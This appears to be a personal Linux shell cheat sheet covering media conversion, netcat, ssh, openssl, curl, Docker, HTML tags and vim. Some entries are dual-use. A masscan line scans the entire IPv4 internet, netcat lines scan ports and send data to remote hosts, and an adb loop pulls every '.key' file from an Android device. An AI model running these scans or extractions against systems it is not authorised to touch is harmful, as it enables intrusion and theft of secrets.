#> AG0DQHJpam5kYWVsLTEyOAAgAGNiYwBtY3J5cHQtc2hhMQAV34412aaE8sRzQPQzi09YaNQPedBzaGExAARvB6A/HYValW4txoCFmrlp57lmvhKBbM4p+OUiZcCxr6Y+Mm7ogg3Y14pHi0CrfT70Tubq9g8/kNJrQr7W/ogHpVuOOdD0YfuRatrV7W2+OlNQ63KX780g4qTHrTqNnyLp8sF5RQ7GwxyZ0OtikROtVIU4g4+QAtn/k/e7h7yt4404VF1zzCYRSw20wmJz1o/Z0XO7E/DFBr5Bau7bWjnF7CRVtimsHGrDwv1miTtAcyB9PknymDxhSyjDUdNhqXGBIioUgqjX1CKgedtO0hQp050MiQd3I6HacpSrVUIWkuuS+BtMrxHDy+48Mh1hidV5JQFP7LP5k+yAVLpeHd2m2eIT1rjVE/Bp2cQVkpODzXcWQDUAswUdvulvj/kWDQ==
$> ./hello
#> This is the fantastic Hello World. Try this: hello [entity]
$> ./hello.scrypt
#> Enter passphrase:
#> This is the fantastic Hello World. Try this: hello.scrypt [entity]
$> ./hello world
#> Hello, world!
$> ./hello.scrypt world
#> Enter passphrase:
#> Hello, world!
##==========================================
## Remove old kernels
$> dpkg --list | grep linux-image | awk '{ print $2 }' | sort -V | sed -n '/'`uname -r`'/q;p' | xargs sudo apt-get -y purge
##==========================================
## Update twitter via curl
$> curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
##==========================================
## Convert MP3s & an image to MP4 videos using ffmpeg
$> for name in *.mp3; do ffmpeg -loop 1 -i imagename.jpg -i "$name" -shortest -c:v libx264 -preset ultrafast -c:a copy "${name%.*}.mp4"; done
##==========================================
## Calculates the number of physical cores considering HyperThreading in AWK
## Check whether hyperthreading is enabled or not. a better solution as nproc should work on all OS with awk Show Sample Output
$> awk -F: '/^core id/ && !P[$2] { CORES++; P[$2]=1 }; /^physical id/ && !N[$2] { CPUs++; N[$2]=1 }; END { print CPUs*CORES }' /proc/cpuinfo
##==========================================
## Determines latest pdf file in ~/Downloads directory
$> ls -tr ~/Downloads/*.pdf | tail -1
##==========================================
## find with high precission (nanoseconds 1/1,000,000,000s) the last changed file.
## this is good for variables if you have many script created files and if you want to know which one is the last created/changed one..
$> find . -type f -print0 | xargs -0 stat -c '%y %n' | sort -n -k 1,1 -k 2,1 | awk 'END{print $NF}'
##==========================================
## Lower jpg quality
$> find -type f -name '*.jpg' -exec mogrify -quality 70% '{}' \;
##==========================================
## Using graphicsmagick, over an image transform the white color to transparent background
$> gm convert source.png -transparent white result.png
##==========================================
## Convert CMYK PSD (Photoshop) file to RGBA
## In case you have a PSD file with CMYK attribute and you need a working image
$> convert <input.psd> -channel RGBA -alpha Set -colorspace rgb <output.png>
##==========================================
## List available upgrades from apt without upgrading the system
$> apt list --upgradable
##==========================================
## Open any file or directory from shell as if clicking double click by mouse
## This command will take an action on the file same as the action gnome was to take.. for example doing this to a jpg file will open the image in image viewer , doing this to a pdf file will open the file in document viewer... it can be used to open a directory as nautilus will do... you might need to add this to an alias since you may use it alot, such as : alias o='gvfs-open'
$> gvfs-open FILE.Ext
##==========================================
## Directory listing and serve folder on port 8000
## Create an index.html containing links of the current folder and serve on the local network Show Sample Output
$> tree -H '.' -L 1 > index.html && php -S `hostname -I | cut -d' ' -`:8000
##==========================================
## Sort subdirectories by size
$> du -h --max-depth=1 | sort -hr
##==========================================
## To rotate all PDF pages clockwise:
$> pdftk in.pdf cat 1-endeast output out.pdf
##==========================================
## Set all CPU cores CPU frequency scaling governor to maximum performance
$> echo performance |sudo tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor
##==========================================
## sed replace in all files of directory
$> find ./ -type f -exec sed -i -e 's/apple/orange/g' {} \;
##==========================================
## How to use netcat
## Before starting to explore some netcat commands its important to know that if you are binding to well-known ports (0-1023) with nc, you need root privilege. Otherwise, you can run nc as a normal user.
## 1. Test if a particular TCP port of a remote host is open
$> nc -vn 192.168.40.146 2424
## Output if the 2424 port on remote server is closed
#$> nc: connect to 192.168.40.146 port 2424 (tcp) failed: Connection refused
## Output if the port on remote server is opened (e.g. 22 port)
#$> Connection to 192.168.40.146 22 port [tcp/*] succeeded!
## SSH-2.0-OpenSSH_7.6p1 Ubuntu-4
##------------------------------------------
## 2. Perform TCP port scanning against a remote host
## The command below will check the ports from 20 to 25 on the remote host and print the result.
$> nc -vnz -w 1 192.168.40.146 20-25
## Output will look like this
## nc: connect to 192.168.40.146 port 20 (tcp) failed: Connection refused
## nc: connect to 192.168.40.146 port 21 (tcp) failed: Connection refused
## Connection to 192.168.40.146 22 port [tcp/*] succeeded!
## nc: connect to 192.168.40.146 port 23 (tcp) failed: Connection refused
## nc: connect to 192.168.40.146 port 24 (tcp) failed: Connection refused
## nc: connect to 192.168.40.146 port 25 (tcp) failed: Connection refused
##------------------------------------------
## 3. Perform UDP port scanning against a remote host
$> nc -vnzu 192.168.40.146 1-65535
## Output will show only the ports which allow udp connections.
## Connection to 192.168.40.146 2424 port [udp/*] succeeded!
## Connection to 192.168.40.146 12354 port [udp/*] succeeded!
##------------------------------------------
## 4. Send a test UDP packet to a remote host
$> echo -n "udp test" | nc -u -w1 192.168.40.146 2424
## The command above will send a test UDP packet with 1 second timeout to a remote host at port 2424
##------------------------------------------
## 5. Copy a file (e.g., test.txt) from one host to another
## On the receiver host (192.168.40.146 in my case) run:
$> nc -lp 2424 > test.txt
## On the sender host (192.168.40.144) run the following command:
$> nc 192.168.40.146 2424 < test.txt
## This will copy test.txt file from sender host to receiver host via 2424 port. make sure to allow incoming connections on 2424 port on the receiver host.
##------------------------------------------
## 6. Transfer a whole directory (including its content) from one host to another
## On the receiver host run:
$> nc -l 2424 | tar xvf -
## On the sender host run the following command:
$> tar cvf - /path/to/dir | nc 192.168.40.146 2424
##------------------------------------------
## 7. Create a compressed backup of hard drive (e.g., /dev/sdc) on a remote host
## On the remote host run:
$> nc -lp 2424 | sudo dd of=/path/to/image.img.gz
## On the local host run the following command:
$> dd if=/dev/sdc | gzip -c | nc 192.168.40.146 2424
##------------------------------------------
## 8. Restore a hard drive (e.g. /dev/sdc) from a compressed disk image stored in a remote host
## On the local host run:
$> nc -lp 2424 | gunzip -c | sudo dd of=/dev/sdc
## On the remote host run the following command:
$> cat /path/to/image.img.gz | nc 192.168.40.144 2424
##------------------------------------------
## 9. Run insecure online chat between two hosts
## On one host (e.g. 192.168.40.144) run the command below:
$> nc -lp 2424
## On another host (e.g. 192.168.40.146) run the following command:
$> nc 192.168.40.144 2424
## After running these commands, anything typed in both terminals will be seen on both host machines.
##------------------------------------------
## 10. Run a web server with a static web page
## Run the command below on local host (e.g. 192.168.40.144) to start a web server that serves test.html on port 80. Note that you must run with sudo privileges as 80 is in range of well known ports (1-1023)
$> while true; do sudo nc -lp 80 < test.html; done
## Now open http://192.168.40.144/test.html from another host to access it.
##------------------------------------------
## 11. Listen on a TCP port using IPv6 address
## You can use the following command to allow nc use IPv6 address when listening on a TCP port.
$> nc -6 -l 2424
## Check if it works with the command below
$> sudo netstat -nap | grep 2424
## Output will look like this
$> tcp6 0 0 :::2424 :::* LISTEN 15665/nc
##------------------------------------------
## 12. Stream a video file from a server for client to watch the streamed video using video player (e.g., mplayer)
## On a video server (192.168.40.144)
$> cat sample_video.avi | nc -l 2424
## On a client host (192.168.40.146):
$> nc 192.168.40.144 2424 | mplayer -vo x11 -cache 3000 -
##==========================================
## To ssh to the server myserver:
$> alias myserver="ssh user@my_server_ip"
##==========================================
## Batch resize images in folder
$> for file in *.jpg; do convert $file -resize 600 sm-$file; done
##==========================================
## Convert hex data to binary with a bash function (requires bash v4+ for the @^^ lowercase hex demangling)
## Use this function with bash version 4+ to convert arbitrary hexadecimal sequences to binary. If you do not have bash 4+ then modify the lowercase to uppercase demangling statement s=${@^^} to set s equal to the uppercase hex input or the bc command throws an input parser error. Show Sample Output
$> function hex2bin () { s=${@^^}; for i in $(seq 0 1 $((${#s}-1))); do printf "%04s" `printf "ibase=16; obase=2; ${s:$i:1};\n" | bc` ; done; printf "\n"; }
##==========================================
## Disable suspend on lid close until current shell exits
## Useful for running long commands with the laptop lid closed and screen off. Also see Gnome extension Caffeine. https://extensions.gnome.org/extension/517/caffeine/
$> exec systemd-inhibit --what=handle-lid-switch --mode=block bash
##==========================================
## function to compute what percentage of X is Y? Where percent/100 = X/Y => percent=100*X/Y
## This function make it easy to compute X/Y as a percentage. The name "wpoxiy" is an acronym of "what percentage of X is Y" Show Sample Output
$> function wpoxiy () { echo $(bc <<< "scale=2; y=${1}; x=${2}; percent=x*100/y; percent")"%"; }
##==========================================
## Lower jpg quality
$> find -type f -name '*.jpg' -exec mogrify -quality 70% '{}' \;
##==========================================
## Batch convert .doc to .txt in a folder
$> for file in *.doc; do antiword "$file" > "$file".txt; done
## Batch convert .odt to .txt in a folder
$> for file in *.odt; do odt2txt "$file" > "$file".txt; done
## Move to new Folder
$> for file in *.txt; do mv ; done
## Batch convert .doc and .odt to .txt in a folder
$> for file in *.doc; do antiword "$file" > "$file".txt; done && for file in *.odt; do odt2txt "$file" > "$file".txt; done &&
## Remove doc and odt
$> rm *.doc && rm *.odt
## Add tags
## Append to all files in a folder: Usage: tag "your appended text"
$> function tag() { for file in *.txt; do  echo ${1} >> "$file"; done }
##==========================================
## Sync rwo folder
$> rsync -r -t -x -v --progress -s --whole-file  /path/bigfolder /path/destination
##==========================================
## Use jupyter on another computer
$> jupyter notebook --no-browser --port=8898
## Create a ssh tunnel to another computer on port 8898
$> ssh -N -L 127.0.0.1:8898:127.0.0.1:8898 username@192.168.1.8
##==========================================
#####################
#     HTML CSS      #
#####################
<<COMMENT1
#####################
#  HTML Cheetsheet  #
#####################
<pre>
## Basic Tags
<html></html> Creates an HTML document
<head></head> Sets off the title and other information that isnâ€™t displayed on the web page itself
<body></body> Sets off the visible portion of the document
##-----------------------------
## Body Attributes
<body bgcolor="pink"> Sets the background color, using name or hex value
<body text="black"> Sets the text color, using name or hex value
<body link="blue"> Sets the color of links, using name or hex value
<body vlink="#ff0000"> Sets the color of followed links, using name or hex value
<body alink="#00ff00"> Sets the color of links on click
<body ondragstart="return false" onselectstart="return false"> Disallows text selection with the mouse and keyboard
##-----------------------------
## Text Tags
<pre></pre> Creates preformatted text
<hl></hl> Creates the largest headline
<h6></h6> Creates the smallest headline
<b></b> Creates bold text
<i></i> Creates italic text
<tt></tt> Creates teletype, or typewriter-style text
<cite></cite> Creates a citation, usually italic
<em></em> Emphasizes a word (with italic or bold)
<strong></strong> Emphasizes a word (with italic or bold)
<font size="3"></font> Sets size of font, from 1 to 7
<font color="green"></font> Sets font color, using name or hex value
##-----------------------------
##  Links
<a href="URL"></a> Creates a hyperlink
<a href="mailto:EMAIL"></a> Creates a mailto link
<a href="URL"><img src="URL"> </a> Creates an image/link
<a name="NAME"></a> Creates a target location within a document
<a href="#NAME"></a> Links to that target location from elsewhere in the document
##-----------------------------
##  Formatting
<p></p> Creates a new paragraph
<p align="left"> Aligns a paragraph to the left (default), right, or center.
<br> Inserts a line break
<blockquote></blockquote> Indents text from both sides
<dl></dl> Creates a definition list
<dt> Precedes each definition term
<dd> Precedes each definition
<ol></ol> Creates a numbered list
<ul></ul> Creates a bulleted list
<li></li> Precedes each list item, and adds a number or symbol depending upon the type of list selected
<div align="left"> A generic tag used to format large blocks of HTML, also used for stylesheets
<img src="name"> Adds an image
<img src="name" align="left"> Aligns an image: left, right, center; bottom, top, middle
<img src="name" border="1"> Sets size of border around an image
<hr /> Inserts a horizontal rule
<hr size="3" /> Sets size (height) of rule
<hr width="80%" /> Sets width of rule, in percentage or absolute value
<hr noshade /> Creates a rule without a shadow
##-----------------------------
## Tables
<table></table> Creates a table
<tr></tr> Sets off each row in a table
<td></td> Sets off each cell in a row
<th></th> Sets off the table header (a normal cell with bold, centered text)
##-----------------------------
## Table Attributes
<table border="1"> Sets width of border around table cells
<table cellspacing="1"> Sets amount of space between table cells
<table cellpadding="1"> Sets amount of space between a cellâ€™s border and its contents
<table width="500" or "80%"> Sets width of table, in pixels or as a percentage of document width
<tr align="left"> or <td align="left"> Sets alignment for cell(s) (left, center, or right)
<tr valign="top"> or <td valign="top"> Sets vertical alignment for cell(s) (top, middle, or bottom)
<td colspan="2"> Sets number of columns a cell should span (default=1)
<td rowspan="4"> Sets number of rows a cell should span (default=1)
<td nowrap> Prevents the lines within a cell from being broken to fit
##-----------------------------
## Frames
<frameset></frameset> Replaces the <body> tag in a frames document; can also be nested in other framesets
<frameset rows="value,value"> Defines the rows within a frameset, using number in pixels, or percentage of width
<frameset cols="value,value"> Defines the columns within a frameset, using number in pixels, or percentage of width
<frame> Defines a single frame â€” or region â€” within a frameset
<noframes></noframes> Defines what will appear on browsers that donâ€™t support frames
## Frames Attributes
<frame src="URL"> Specifies which HTML document should be displayed
<frame name="name"> Names the frame, or region, so it may be targeted by other frames
<frame marginwidth="value"> Defines the left and right margins for the frame; must be equal to or greater than 1
<frame marginheight="value"> Defines the top and bottom margins for the frame; must be equal to or greater than 1
<frame scrolling="value"> Sets whether the frame has a scrollbar; value may equal â€œyes,â€ â€œno,â€ or â€œauto.â€ The default, as in ordinary documents, is auto.
<frame noresize="noresize"> Prevents the user from resizing a frame
##-----------------------------
##  Forms
##  For functional forms, youll have to run a script. The HTML just creates the appearance of a form.
<form></form> Creates all forms
<select multiple name="NAME" size=?></select> Creates a scrolling menu. Size sets the number of menu items visible before you need to scroll.
<option> Sets off each menu item
<select name="NAME"></select> Creates a pulldown menu
<option> Sets off each menu item
<textarea name="NAME" cols=40 rows=8></textarea name> Creates a text box area. Columns set the width; rows set the height.
<input type="checkbox" name="NAME"> Creates a checkbox. Text follows tag.
<input type="radio" name="NAME" value="x"> Creates a radio button. Text follows tag
<input type="text" name="NAME" size=20> Creates a one-line text area. Size sets length, in characters.
<input type="submit" value="NAME"> Creates a Submit button
<button type="submit">Submit</button> Creates an actual button that is clicked
<input type="image" border=0 name="NAME" src="name.gif"> Creates a Submit button using an image
<input type="reset"> Creates a Reset button
</pre>
COMMENT1
##------------------------------------------
## Create simple html doc with a lot of simple elements
$> echo -e ' <html>\n    <head></head>\n    <body bgcolor="pink" text="black" link="blue" vlink="#ff0000" alink="#00ff00">\n        <p>Regular text</p><p align="center">\n        <hl>largest headline</hl><br>\n        <h6>smallest headline</h6>\n        <b>bold</b>\n        <i>italic</i>\n        <tt>teletype</tt>\n        <strong>Emphasizes</strong>\n        <font size="1">font1</font>\n        <font size="7">font7</font>\n        <font color="green">green</font>\n        <a href="URL">hyper</a>\n        <a href="URL"><img src="img.jpg"></a>\n        <a name="NAME">target</a>\n        <a href="#NAME">NAME</a></p>\n        <p><ol><li>thing1</li><li>thing2</li></ol></p>\n        <p><ul><li>thing1</li><li>thing2</li></ul></p>\n        <p><div align="right"  >Right</p>\n        <img src="img.jpg" align="left" border="1">\n        <hr size="3" width="80%" noshade />\n        <p><table border="1" cellspacing="1" cellpadding="1" width="50%" align="center">\n            <caption>label</caption>\n            <tr align="left"><th colspan="2">header1</th><th align="center">header2</th><th>header3</th>\n                <tr><td rowspan="2">item1</td><td valign="top">item2</td><td align="right">right 1tem3</td><td nowrap>Prevents the lines within a cell from being broken to fit</td></tr>\n                <tr><td>item1</td><td>item2</td><td>item3</td></tr></tr>\n        </table></p>\n        <p></p>\n    </body>\n</html> ' > index2.html
##==========================================
#####################
##    END HTML CSS
#####################
##==========================================
##==========================================
## exif data
## Read write exif data
$> sudo apt-get install libimage-exiftool-perl
## Extract and view all EXIF metadata from an image or photo:
$> exiftool image.jpeg
## Remove all EXIF metadata from an image or photo:
$> exiftool -all= image.jpeg
## Remove EXIF Data from Multiple Files
## The next commands, also makes copies of the original files with the “_original” prefix.
## Remove all EXIF metadata from all images in the current directory:
$> exiftool -all= *
## Remove EXIF metadata from images with “.jpeg” extensions only:
$> exiftool -all= *.jpeg
##==========================================
## Change permissions
## Change permissions of a single file
$> chmod 640 file_name.ext
## Find all directories and change permissions
$> find . -type d -exec chmod 755 {} \;
## Find all files in directories and change permissions
$> find . -type f -exec chmod 644 {} \;
## Find all files of name, in this case any .php files, and change permissions
$> find . -type f -name “*.php” | xargs chmod 644
## Recursive change the owner and group of all files in all directories
$> chown -R $USER:group_to_change_to *
## Recursive change the group of all files single directory
$> chown -R :group_to_change_to /path
##==========================================
## Use imagemagik to add a centered overlayed png on top of a background image
$> composite -gravity center overlay.png  background.jpg  result1.jpg
##==========================================
## https://ittutorials.net/open-source/owncloud/installing-owncloud-in-ubuntu/
##==========================================
## lsyncd
## https://axkibe.github.io/lsyncd/manual/config/layer4/
## https://www.digitalocean.com/community/tutorials/how-to-set-up-ssh-keys--2
##==========================================
## Remove a ssh known host from encrypted list -f file, -R remove
$> ssh-keygen -f "~/.ssh/known_hosts" -R 192.168.1.8
##==========================================
### Add keys to ssh servers
## generate the keys:
$> ssh-keygen -t rsa
## Then use this command to push the key to the remote server, modifying it to match your server name.
$> cat ~/.ssh/id_rsa.pub | ssh user@hostname 'cat >> .ssh/authorized_keys'
##==========================================
## Pulseaudio to make bluetooth headphones behave normally and automatically switch them to HFP/HSP mode whenever microphone is requested (slack, hangouts calls etc.) and back to A2DP when that is ended.
## append auto_switch=2 to load-module module-bluetooth-policy in /etc/pulse/default.pa
$> echo 'load-module module-bluetooth-policy auto_switch=2' >>  /etc/pulse/default.pa
##==========================================
## stream with youtube-dl and vlc, like so:
$> youtube-dl -o - websitelink | vlc -
$> youtube-dl -o - websitelink |
##==========================================
## BASH C language math syntax (including comma), !!no floating point numbers!!
$> echo $((a=2,b=3,c=a*b,c))              # 6
##------------------------------------------
## python math awesome
$> python3 -c "a=2;b=3;print(a+b);"       # 5
$> python3 -c "a=2;b=3;print(a*b);"       # 6
$> python3 -c "a=2;b=3;print(a/b);"       # 0.666666666
$> python3 -c "a=2;b=3;print(a*b**2);"    # 18
$> python3 -c "a=2;b=3;print((a*b)**2);"  # 36
##==========================================
## Builtin function compgen info on environment
## no man page, man compgen -a alias -b shell builtins -c all commands -d directory -e exported shell variables -f file and functions -g groups -j job -k Shell reserved words -s service -u userAlias names -v shell variables
$> compgen -a
##==========================================
## Create multiple subfolders in one command.
$> mkdir -p /path/folder{1..4}
$> mkdir -p /path/{folder1,folder2,folder3,folder4}
##==========================================
## openssl certificate
## Generate a self-signed certificate
$> openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout privateKey.key -out certificate.crt
##------------------------------------------
## Generate a new private key and Certificate Signing Request. CSR.csr MUST be extist before !
## CSR.csr MUST be extist before !
$> openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout privateKey.key
##------------------------------------------
## Generate a certificate signing request based on an existing certificate. certificate.crt MUST be exists before !
## certificate.crt MUST be exists before !
$> openssl x509 -x509toreq -in certificate.crt -out CSR.csr -signkey privateKey.key
##------------------------------------------
## Remove key from known_hosts
$> ssh-keygen -R "hostname"
##------------------------------------------
## Check SSL expiry from commandline
$> echo | openssl s_client -showcerts -servername google.com -connect gnupg.org:443 2>/dev/null | openssl x509 -inform pem -noout -text
## Remove a passphrase from a private key
openssl rsa -in privateKey.pem -out newPrivateKey.pem
## Remove key from known_hosts
$> ssh-keygen -R "hostname"
##==========================================
## scan whole internet and specific port in humanistic time
$> apt-get install git gcc make libpcap-dev git clone https://github.com/robertdavidgraham/masscan cd masscan make install -pDm755 bin/masscan /usr/bin/masscan
$> masscan 0.0.0.0/0 -p8080,8081,8082 --max-rate 100000 --banners --output-format grepable --output-filename /tmp/scan.xt --exclude 255.255.255.255
##==========================================
## wget download with multiple simultaneous connections
$> cat url.list | parallel -j 8 wget -O {#}.html {}
##==========================================
## Split video files using avconv along keyframes
$> avconv -i SOURCE.mp4 -f segment -c:v copy -bsf:v h264_mp4toannexb -an -reset_timestamps 1 OUTPUT_%05d.h264
##==========================================
## Open clipboard content on vim
## Instead of using clipboard register after opening vim we can use this command in order to edit clipboard content. For those who already have "xclip -i -selection clipboard -o" aliased to pbpaste it is yet more simple, just: alias vcb='pbpaste | vim -'
$> alias vcb='xclip -i -selection clipboard -o | vim -'
##==========================================
## replace recursive in folder with sed
$> find <folder> -type f -exec sed -i 's/my big String/newString/g' {} +
##==========================================
## draw honeycomb
## Fill the entire terminal screen. Is COLUMNS or LINES are undefined run "resize"
$> yes "\\__/ " | tr "\n" " " | fold -$((($COLUMNS-3)/6*6+3)) | head -$LINES
##==========================================
## List all packages
$> pm list packages|cut -d: -f2
## Uninstall bloatware on your android device without root.
$> pm uninstall --user 0 com.package.name
##------------------------------------------
## Factory reset your android device via commandline.
$> am broadcast -a android.intent.action.MASTER_CLEAR
##------------------------------------------
## Download all .key files from your android device to your pc.
$> for i in `adb shell "su -c find /data /system -name '*.key'"`; do mkdir -p ".`dirname $i`";adb shell "su -c cat $i" > ".$i";done
$> for i in $(adb shell pm list packages | awk -F':' '{print $2}'); do adb pull "$(adb shell pm path $i | awk -F':' '{print $2}')"; mv *.apk $i.apk 2&> /dev/null ;done
##==========================================
## Toggle the Touchpad on or off
$> tp=$(synclient -l | grep TouchpadOff | awk '{ print $3 }') && tp=$((tp==0)) && synclient TouchpadOff=$tp
##==========================================
$> firefox https://www.maketecheasier.com/setup-wifi-on-raspberry-pi/
##==========================================
## ################
## # sed awk grep #
## ################
##------------------------------------------
##==========================================
### sed awk grep
## http://www.theunixschool.com/p/awk-sed.html
## http://matt.might.net/articles/sculpting-text/
##==========================================
### sed
$> sed -i 's/[ch]at/ball/g' in.txt
$> sed 's/[ch]at/ball/g' < in.txt > out.txt
$> cat in.txt | sed 's/[ch]at/ball/g' > out.txt
##==========================================
## Use sed to replace string between two lines.  Good for config files with multiple sections with similar config names and you only want to change one of them, like in apache config
$> sudo sed -i '\%^Between start line%,\%^and end line% s/change this/to that/' /path/setup.conf
##==========================================
##------------------------------------------
### awk
## takes files arranged as records and fields like a csv or a relational database
##         field1 field2 field3
## record1
## record2
## record3
$> if (expression) statement [ else statement ]
$> while (expression) statement
$> for (expression; expression; expression) statement
$> for (var in array) statement
$> do statement while (expression)
$> break
$> continue
$> { [ statement ... ] }
$> expression
$> print [ expression-list ] [ > expression ]
$> printf format [ , expression-list ] [ > expression ]
$> return [ expression ]
$> next
$> nextfile
$> delete array[expression]
$> delete array
$> exit [ expression ]
##==========================================
## beet music tagger and library organizer piped to mpv to play it
$> beet play *search-term-here* | mpv
##==========================================
## commandline reddit!
$> ssh redditbox.us
##==========================================
## Commandline Laptop Battery Optimization. TLP starts automatically on boot.
$> sudo add-apt-repository ppa:linrunner/tlp
$> sudo apt update
$> sudo apt install tlp tlp-rdw
##==========================================
### curl
## send a POST request using curl command --data option is used
$> curl --data "name=Mona&age=20" https://www.example.com/update_info
## download file with the name new_file.zip at a set speed.
$> curl --limit-rate 300K -O new_file.zip http://wwww.example.com/example_file.zip
## Resume uncompleted downloads
$> curl -C - -O http://ubuntu.biz.net.id/18.04.2/ubuntu-18.04.2-desktop-amd64.iso
## check HTTP headers
$> curl -I http://www.yahoo.com
## Download files from or to FTP server
$> curl -u username:password -O ftp://example_server/example_file.tar.gz
## Upload files from or to FTP server
$> curl -u username:password -T ftp://example_server/example_file.tar.gz
## Firefox user agent
$> curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" https://example.com/
## download the file which updated before a specific time
$> curl -z 28-Feb-19 http://www.mywebsite.com/xyz.zip
## download the file if it is updated after 28 Feb 2019.
$> curl -z -28-Feb-19 http://www.mywebsite.com/xyz.zip
##==========================================
## ######################
## ##    Docker
## ######################
## Docker info
##------------------------------------------
## docker [option] [subcommand] [arguments]
$> sudo apt install apt-transport-https ca-certificates curl software-properties-common
## Now Import the GPG key for repository using following curl command:
$> curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
## Finally, add the repository to your system typing following in the terminal, "lsb_release -cs" does not work in mint:
$> sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
$> sudo apt install docker-ce
## Or for bionic
$> sudo apt install docker.io
$> docker --version
$> sudo systemctl status docker
$> sudo usermod -aG docker $USER
$> id -nG
## search for an image on Docker Hub
$> docker search ubuntu
## pull an image on Docker Hub
$> docker pull ubuntu
## List Downloaded Docker Images
$> docker images
## Remove Docker Images
$> docker image rm ubuntu
## Start a Container
$> docker container run ubuntu
## To interact with Ubuntu container after booting up, use -it switch.
$> docker container run -it ubuntu /bin/bash
## Active Docker Containers
$> docker container ls
$> docker container ls -a
## Remove Docker Container
$> docker container rm 748fh3304412
## List Docker CLI commands
$> docker
$> docker container --help
## Display Docker version and info
$> docker --version
$> docker version
$> docker info
## Execute Docker image
$> docker run hello-world
## List Docker images
$> docker image ls
## List Docker containers (running, all, all in quiet mode)
$> docker container ls
$> docker container ls --all
$> docker container ls -aq
## Run Docker container
$> docker pull hellow-world
$> docker run hello-world
### building an app the Docker way
## portable images are defined by a Dockerfile
## Python app Docker build
## Define a container with Dockerfile, requirements.txt and app.py
$> mkdir Dockerfile; cd Dockerfile
$> echo '
# Use an official Python runtime as a parent image
FROM python:3.7-slim

# Set the working directory to /app
WORKDIR /app

# Copy the current directory contents into the container at /app
COPY . /app

# Install any needed packages specified in requirements.txt
RUN pip install --trusted-host pypi.python.org -r requirements.txt

# Set proxy server, replace host:port with values for your servers
#ENV http_proxy host:port
#ENV https_proxy host:port

# Make port 80 available to the world outside this container, can you 8080 or another port
EXPOSE 80

# Define environment variable
ENV NAME World

# Run app.py when the container launches
CMD ["python", "app.py"]
' > Dockerfile
$> touch requirements.txt
$> echo '
Flask
Redis
' > requirements.txt
## Put the python app in this file
$> touch app.py
$> echo '
#from flask import Flask
#from redis import Redis, RedisError
#import os
#import socket
#
### Connect to Redis
#redis = Redis(host="redis", db=0, socket_connect_timeout=2, socket_timeout=2)
#
#app = Flask(__name__)
#
#@app.route("/")
#def hello():
#    try:
#        visits = redis.incr("counter")
#    except RedisError:
#        visits = "<i>cannot connect to Redis, counter disabled</i>"
#
#    html = "<h3>Hello {name}!</h3>" \
#           "<b>Hostname:</b> {hostname}<br/>" \
#           "<b>Visits:</b> {visits}"
#    return html.format(name=os.getenv("NAME", "world"), hostname=socket.gethostname(), visits=visits)
#
#if __name__ == "__main__":
#    app.run(host='0.0.0.0', port=80)
#' > app.py
## Remove leading #
$> sed -i 's/^#//g' ./app.py
## run the build command
$> docker build --tag=friendlyhello:v0.0.1 .
$> docker image ls
## if changes are made to the Dockerimage file, run
$> sudo service docker restart
## Run the app
## map your machine’s port 4000 to the container’s published port 80 using -p
$> docker run -p 4000:80 friendlyhello
## Check the conection
$> w3m -dump http://localhost:4000
## run the app in the background, in detached mode:
$> docker run -d -p 4000:80 friendlyhello
## Check the running container, will show CONTAINER ID
$> docker container ls
## Stop by CONTAINER ID
$> docker container stop 1fa4ab2cf395
## Can publish the images on Dockerhub, once published can be run on any machine
## Will pull and run Docker image
$> docker run -p 4000:80 username/repo:tag
## Install docker-compose
$> curl -L https://github.com/docker/compose/releases/download/1.24.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose
$> chmod +x /usr/local/bin/docker-compose
### enable load-balancing Scaling a service changes the number of container instances running that piece of software, assigning more computing resources to the service in the process.
$> firefox https://docs.docker.com/get-started/part3/
## scale services with the Docker platform, write a docker-compose.yml file
$> echo '
#version: "3"
#services:
#  web:
#    ## replace username/repo:tag with your name and image details
#    image: username/repo:tag
#    deploy:
#      replicas: 5
#      resources:
#        limits:
#          cpus: "0.1"
#          memory: 50M
#      restart_policy:
#        condition: on-failure
#    ports:
#      - "4000:80"
#    networks:
#      - webnet
#networks:
#  webnet:
#' > docker-compose.yml
## Remove leading #
$> sed -i 's/^#//g' ./docker-compose.yml

## https://docker-curriculum.com/
## Read and do walkthrough on elasticsearch

## ######################
## ##    END Docker
## ######################
##==========================================
## #########################
## ##    vim
## #########################
## man vim - Vi IMproved, a programmers text editor.  Vim  is a text editor that is upwards compatible to Vi.  It can be used to edit all kinds of plain text.  It is especially useful  for  editing programs.
##--------------------------------------------
$>  vim filename            ## Open file in vim
$>  :Explore                ## File explorer
$>  :Sex                    ## Split explore, open another file in slit pane
$>  cntl+w+w                ## Change panes in split mode
$>  :saveas                 ## Save current document as another name
$>  vim +300 filename       ## Open file on line 300
$>  vim +/term filename     ## Open file in vim at first instance of search term
$>  vim ~/.vimrc            ## Write startup script
$>  vim -x filename         ## add password and encryption to file
$>  find . | vim -          ## send output to vim for editing and then save to file
$>  h,j,k,l                 ## Move the cursor around the screen until you are comfortable.
$>  <ESC>                   ## Normal mode.
$>  :q! <ENTER>             ## Exit the editor, DISCARDING any changes you have made.
$>  :w                      ## Save
$>  :w filename             ## Save as
$>  :wq                     ## Save the file with changes and exit
$>  ZZ                      ## Save and close
$>  x                       ## delete character under cursor
$>  i                       ## insert mode, can write text <ESC> to leave insert mode and enter normal mode
$>  a                       ## append mode append text to end of cursor location <ESC> to enter normal mode
$>  A                       ## append text to end of line
$>  dw                      ## Delete word
$>  d$                      ## Delete to end of line
$>  d^                      ## Delete backwards to begininng of line
$>  d2w                     ## Delete 2 words
$>  u                       ## undo
$>  U                       ## undo all changes on line
$>  CTRL-R                  ## redo, undo the undo
$>  dd                      ## Delete line
$>  p                       ## Put deleted text (paste)
$>  0                       ## go to first position in line
$>  ^                       ## go to first non space character in line
$>  ce                      ## change text to end of line and enter insert mode
$>  c$                      ## change text to end of line and enter insert mode
$>  c^                      ## change text to first non space character and enter insert mode
$>  c0                      ## change text to beginning of line and enter insert mode
$>  cw                      ## change text in word and enter insert mode
$>  c2w                     ## change text in two words and enter insert mode
$>  p                       ## Put deleted text
$>  ctrl-g                  ## Show info at bottom filename and line number
